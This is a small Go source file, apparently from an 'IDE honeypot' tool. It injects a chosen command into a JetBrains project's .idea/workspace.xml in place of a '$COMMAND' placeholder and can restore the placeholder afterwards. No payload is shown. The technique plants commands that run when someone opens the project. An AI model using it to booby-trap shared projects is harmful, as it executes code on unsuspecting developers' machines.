package write

import (
	"ide-honeypot/model"
	"log"
	"os"
	"strings"
)

func Write(info model.Info) {
	content, err := os.ReadFile("source/.idea/workspace.xml")
	if err != nil {
		panic(err)
	}
	content = []byte(strings.Replace(string(content), "$COMMAND", info.Command, 1))
	err = os.WriteFile("source/.idea/workspace.xml", content, 0755)
	if err != nil {
		panic(err)
	}
	log.Println("已将命令写入workspace.xml")

}

func WriteOld(new string) {
	old := "$COMMAND"

	content, err := os.ReadFile("source/.idea/workspace.xml")
	if err != nil {
		panic(err)
	}
	content = []byte(strings.Replace(string(content), new, old, 1))
	err = os.WriteFile("source/.idea/workspace.xml", content, 0755)
	if err != nil {
		panic(err)
	}

	log.Println("已恢复默认默认命令")
}
